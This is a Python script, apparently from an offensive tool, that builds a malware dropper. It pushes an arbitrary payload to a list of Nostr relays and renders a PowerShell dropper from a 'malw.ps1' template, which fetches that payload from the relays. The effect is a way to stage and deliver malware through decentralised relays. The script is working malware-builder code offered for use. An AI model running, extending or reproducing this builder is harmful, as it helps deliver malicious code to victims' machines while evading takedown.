import os, hashlib, argparse

from pynostr.key         import PrivateKey

from src.interact_nodes  import pull, push
from src.get_nodes       import main as get_nodes
from src.render_malware  import main as render_malware


PRIVATE_KEY = PrivateKey()
PUBLIC_KEY  = PRIVATE_KEY.public_key.hex()


def shahify( string ):
    return hashlib.sha256(string.encode()).hexdigest()


#
#   Main flow of the code.
#
def main( relaylist : str, payload : str, output_file : str = "./outputs/m.ps1" ):
    global PRIVATE_KEY
    relays = []
    
    # Load in the list of relays/nodes
    with open( relaylist, "r" ) as file:
        for line in file.readlines():
            relays.append( line.strip("\n") )
                 
    # Push the payload the dropper fetches to nostr
    msg_public_key = ""
    for relay in relays:
        _return = push( 
            relay        = relay,
            private_key  = PRIVATE_KEY,
            user_content = payload,
        )
        
        msg_public_key = _return[ 0 ]
        print(relay, msg_public_key) # debug print

    # Once done, 
    # Render and write the 'dropper' file.
    dropper_file = render_malware( 
        "./templates/malw.ps1", 
        relays, 
        msg_public_key 
    )
    
    # Ensure output directory exists
    target_dir = "/".join( output_file.split("/")[:-1])
    if not os.path.isdir( target_dir ): 
        os.mkdir( target_dir )
            
    with open( output_file, "w+" ) as file:
        file.write( dropper_file )
        
        
if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--relays",  "-r", required=True)
    parser.add_argument("--payload", "-p", required=True)
    args = parser.parse_args()

    main( 
        relaylist = args.relays, 
        payload   = args.payload
    )

